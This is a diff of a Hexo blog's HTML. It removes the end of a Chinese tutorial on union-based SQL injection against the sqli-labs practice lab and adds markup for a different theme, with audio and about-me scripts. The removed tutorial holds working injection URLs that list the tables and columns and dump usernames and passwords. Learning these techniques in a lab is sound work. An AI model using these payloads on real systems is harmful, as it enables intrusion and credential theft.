-<p>在这里的意思是将id的值等于一个在数据库中不存在的数，通过联合查询可以看出输入的数据会在哪里显示出来。<br><img src="https://img-blog.csdnimg.cn/20200228194255782.png" alt="在这里插入图片描述"><br>结果显示出了2 3的位置，所以在2 3位置我们便可以输入我们想用的句子。<br><strong>爆数据库</strong><br>爆数据库时可以通过一个<strong>database()</strong>语句来查看当前的数据库</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-1/?id=0' union select 1,database(),3 --+</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200228194743939.png" alt="在这里插入图片描述"><br><strong>爆数据表</strong><br>在上面说的一些语句，这里就要用到了<br>既然是爆数据表，首先就需要一个group_concat()函数加一个数据表名table_name,然后还需要指定一个来源，而来源就是所有库的表名从上面爆出来的数据库中</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200229193148686.png" alt="在这里插入图片描述"><br><strong>爆字段</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.column where table_schema='users'),3 --+</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200229194221881.png" alt="在这里插入图片描述"><br><strong>爆值</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200229194455846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样，值就被爆出来了！</p>
-<hr>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-  </div>
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-  </nav>
-
-
-
-          </div>
-          
+<audio id="bgaudio" loop="loop" preload="none"> 
+  <source src=http://cdn.calm.com/scenes/scene-Qqkzy9k7Eo.m4a?v=1418162240715 type="audio/mpeg">
+</audio>
 
 <script>
-  window.addEventListener('tabs:register', () => {
-    let activeClass = CONFIG.comments.activeClass;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
+$(document).ready(function(){
+  //播放按钮点击
+  var audio = $("#bgaudio")[0];
+  var img = $("#play-img")[0];
+  $("#play-button").click(function(){ 
+    if (audio.paused || audio.ended) {
+      audio.play();
+      img.src = "/images/playback_pause.png";
+    } else {
+      audio.pause();
+      img.src = "/images/playback_play.png";
     }
   });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
+});
 </script>
 
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
+
+
+
+<div id="me-button">
+		<img id="play-img" src="/images/me_n.png">
+		</img>
+</div>
+
+<div id="social-div">
+
+
+    
+    
+    <a class="social-a" href="http://weibo.com/3169700852/" target="_blank">
+        <img src="/images/weibo.png">
+    </a>
+    
+
+    
+    
+    <a class="social-a" href="https://github.com/iHongRen" target="_blank">
+        <img src="/images/github.png">
+    </a>
+    
+
+    
+    
+    <a class="social-a" href="https://twitter.com/ihongren" target="_blank">
+        <img src="/images/twitter.png">
+    </a>
+    
+
+
+</div>
+
+
+<div id="about-me">
+  <div id="about-me-inner">
+    <article class="markdown-body"></article>
   </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">moMaxX</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">16</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-  </nav>
 </div>
 
 
+<!--[if lt IE 9]>
+<script>
+	document.createElement('video');
+</script>
+<![endif]-->
 
-      </div>
+
+<script>
+
+$(document).ready(function(){
+  //判断是否该显示’关于我‘
+  if( "home_about"  == 'home_about') {
+    $("#about-me").hide(0);
+
+    //加载about(关于)读取文件
+    var s = $('article').html();
+    if (s.length < 2) {
+      var url = window.location.protocol+"//"+window.location.host+"/about/";
+      $.ajax({ 
+          type: "GET", 
+          url: url, 
+          dataType: "html", 
+          success: function (data) { 
+            $('article').html($(data).find('article').html());//解析about的html
+            $("#about-me").css({"visibility": "visible"}).delay(100);
+            $("#about-me").slideToggle('slow');
+          }
+      }); 
+      }
+
+    //个人按钮点击，隐藏和显示关于界面
+    $("#me-button").click(function(){ 
+      $("#social-div").slideToggle();
+      $("#about-me").slideToggle();
+    });
+  }
+});
+</script>
+
+
 
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">moMaxX</span>
+  </div>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+
+
+
+<div id="bottom-outer">
+  
+  <div id="bottom-inner">
+    moMaxX 
+    ©2020 |Powered by  
+    <a href="http://hexo.io" target="_blank">Hexo</a> with theme 
+    <a href="https://github.com/iHongRen/legend" target="_blank">legend</a>
   </div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
-  </div>
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/muse.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
+    
+    
+    
+      <a href="/atom.xml">
+      
+      <img src=/images/rss.png height="18" width="18">
+      
+</div> 
 
 
   
-
-
-
-
   
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-
+    <script src="/js/legend.js"></script>
   
 
-  
 
 </body>
 </html>
+
+
+<script>
+$(window).on('load', function(){
+   $('pre').addClass('prettyprint').attr('style', 'overflow:auto;');
+   prettyPrint();
+ });
+</script>
+
